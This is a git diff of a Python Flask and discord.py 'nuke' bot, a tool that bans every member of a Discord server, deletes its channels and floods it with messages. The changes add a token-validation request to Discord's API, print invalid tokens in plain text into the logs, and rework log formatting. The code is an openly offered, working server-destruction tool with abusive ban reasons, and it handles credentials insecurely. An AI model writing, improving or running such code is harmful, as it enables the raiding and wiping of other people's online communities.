@@ -1,11 +1,10 @@
-import traceback, threading, datetime, asyncio, discord, random, string
+import traceback, threading, requests, datetime, asyncio, discord, random, string, base64
 from flask import Flask, request, redirect, render_template
 
 app = Flask(__name__)
 
 logs = {}
 stops = []
-
 
 class DiscordBot(discord.Client):
     def __init__(self, logId:str, token:str, id:int, name:str, latency:int, message:str, option:list[bool], mode:int):
@@ -22,6 +21,14 @@ class DiscordBot(discord.Client):
         if mode == 0:
             self.allUserBan, self.allChannelDelete, self.randomMention, self.exclusionServerIds = option
         self.mode = mode
+    def isEnableToken(self, token:str):
+        if not token: return False
+        headers = {
+            "Content-Type": "application/json",
+            "Authorization": token
+        }
+        res = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
+        return str(res.status_code)[0] == "2"
     async def banUser(self, user:discord.Member):
         try:
             await user.ban(reason="Fuck Server User")
@@ -29,7 +36,7 @@ class DiscordBot(discord.Client):
         except:
             logs[self.logId] += "-- Error --\n"
             logs[self.logId] += "[-]Failed"
-        logs[self.logId] += f" | {str(datetime.datetime.now())} BanUser ID:{user.id} Name:{user.name}\n"
+        logs[self.logId] += f" - {str(datetime.datetime.now())} BanUser ID:{user.id} Name:{user.name}\n"
     async def deleteChannel(self, channel:discord.abc.GuildChannel):
         try:
             await channel.delete()
@@ -37,7 +44,7 @@ class DiscordBot(discord.Client):
         except:
             logs[self.logId] += "-- Error --\n"+traceback.format_exc()+"\n"
             logs[self.logId] += "[-]Failed"
-        logs[self.logId] += f" | {str(datetime.datetime.now())} DeleteChannel ID:{channel.id} Name:{channel.name}\n"
+        logs[self.logId] += f" - {str(datetime.datetime.now())} DeleteChannel ID:{channel.id} Name:{channel.name}\n"
     async def sendMessage(self, message:str, channel:discord.abc.GuildChannel, latencyMs:float):
         if channel in self.guild.categories:
             self.channels.remove(channel)
@@ -48,7 +55,7 @@ class DiscordBot(discord.Client):
         except Exception as e:
             logs[self.logId] += f"[-]Failed {e}"
             self.channels.remove(channel)
-        logs[self.logId] += f" | {str(datetime.datetime.now())} SendMessage ID:{channel.id}\n"
+        logs[self.logId] += f" - {str(datetime.datetime.now())} SendMessage ID:{channel.id}\n"
         await asyncio.sleep(latencyMs)
     async def banAllUser(self, guild:discord.Guild):
         logs[self.logId] += "---- Start AllUserBan ----\n"
@@ -74,7 +81,6 @@ class DiscordBot(discord.Client):
             for _ in range(numberOfExecutions):
                 if self.logId in stops:
                     logs.pop(self.logId)
-                    await self.close()
                     return
                 logs[self.logId] += "--- Nuke ---\n"
                 for channel in self.channels:
@@ -105,14 +111,12 @@ class DiscordBot(discord.Client):
         except:
             logs[self.logId] += "-- Error --\n"+traceback.format_exc()+"\n"
         logs[self.logId] += "---- End ----\n"
-        await self.close()
     async def on_ready(self):
-        logs[self.logId] += f"ID:{self.user.id}, Name:{self.user.name}\n\n"
+        logs[self.logId] += f"Start Client - Token:{base64.b64encode(str(self.user.id).encode()).decode()}, ID:{self.user.id}, Name:{self.user.name}\n"
+        self.guild = self.get_guild(self.guildId)
         if self.mode == 0:
-            self.guild = self.get_guild(self.guildId)
             if not self.guild:
-                logs[self.logId] += f"Error: The server you entered has not been joined by a bot."
-                await self.close()
+                logs[self.logId] += f"Error: The server you entered has not been joined by a bot - ID:{self.user.id}\n"
                 return
             try:
                 i = self.guild.get_member(self.user.id)
@@ -129,6 +133,9 @@ class DiscordBot(discord.Client):
             return
     def runBot(self):
         try:
+            if not self.isEnableToken(self.token):
+                logs[self.logId] += f"Error: invalid token - {self.token}"
+                return
             self.run(self.token, reconnect=True)
         except:
             logs[self.logId] += f"Error:\n{traceback.format_exc()}"
